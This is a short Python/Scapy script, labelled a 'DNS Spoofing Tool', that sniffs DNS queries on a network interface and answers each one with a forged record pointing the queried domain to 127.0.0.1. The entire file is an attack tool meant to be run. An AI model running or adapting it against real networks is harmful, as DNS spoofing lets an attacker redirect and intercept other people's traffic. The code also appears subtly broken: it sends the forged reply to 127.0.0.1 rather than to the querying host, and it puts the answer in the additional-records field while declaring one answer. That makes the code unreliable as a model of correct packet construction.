from scapy.all import *
import argparse
import sys
from typing import Optional

def list_interfaces():
    """List all available network interfaces."""
    print("\nAvailable interfaces:")
    for iface in conf.ifaces:
        print(f"- {iface}")

def spoof_dns(pkt):
    try:
        # Check if the packet has a DNS question record
        if (DNS in pkt and pkt[DNS].qr == 0):
            # Get the queried domain
            domain = pkt[DNS].qd.qname.decode('utf-8')

            # Create a spoofed response
            ip = IP(dst="127.0.0.1")
            udp = UDP(dport=pkt[UDP].sport, sport=53)

            # DNS Answer
            dns = DNS(
                id=pkt[DNS].id,
                qd=pkt[DNS].qd,
                aa=1,
                rd=0,
                qr=1,
                ra=1,
                qdcount=1,
                ancount=1,
                nscount=0,
                arcount=0,
                ar=DNSRR(
                    rrname=pkt[DNS].qd.qname,
                    type='A',
                    ttl=3600,
                    rdata='127.0.0.1'
                )
            )

            # Construct and send the spoofed packet
            spoofed_pkt = ip/udp/dns
            send(spoofed_pkt, verbose=0)
            print(f"Spoofed DNS response for {domain} -> 127.0.0.1")
    except Exception as e:
        print(f"Error processing packet: {str(e)}")

def main():
    try:
        parser = argparse.ArgumentParser(description='DNS Spoofing Tool')
        parser.add_argument('-i', '--interface', help='Network interface to use')
        parser.add_argument('-l', '--list', action='store_true', help='List available interfaces')
        args = parser.parse_args()

        if args.list:
            list_interfaces()
            sys.exit(0)

        # if not args.interface:
        #     print("Error: No interface specified. Use -i to specify an interface or -l to list available interfaces.")
        #     list_interfaces()
        #     sys.exit(1)

        print(f"[*] Starting DNS spoofing on interface {args.interface}")
        print("[*] All DNS requests will be redirected to 127.0.0.1")
        print("[*] Press Ctrl+C to stop")

        # Set up sniffing with custom filter for DNS queries
        try:
            sniff(
                #iface="\\Device\\NPF_{24F05FCC-EFF0-4A18-9D08-E49D110B0F0E}",
                prn=spoof_dns,
                store=0
            )
        except Exception as e:
            print(f"\nError: Failed to start sniffing: {str(e)}")
            list_interfaces()
            sys.exit(1)

    except KeyboardInterrupt:
        print("\n[*] Stopping DNS spoofing...")
        sys.exit(0)
    except Exception as e:
        print(f"\nError: {str(e)}")
        list_interfaces()
        sys.exit(1)

if __name__ == "__main__":
    main()
